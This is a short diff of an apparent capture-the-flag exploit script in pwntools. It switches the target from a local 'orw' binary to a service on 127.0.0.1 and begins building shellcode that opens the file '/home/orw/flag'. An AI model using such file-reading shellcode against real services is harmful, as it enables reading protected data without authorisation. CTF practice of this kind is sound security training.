@@ -1,6 +1,8 @@
 from pwn import *
 context.arch = 'amd64'
-r = process('../orw/share/orw')
+#r = process('../orw/share/orw')
+r = remote('127.0.0.1', 10004)
+
 shellcode = b""
 
 shellcode += asm(shellcraft.pushstr('/home/orw/flag'))
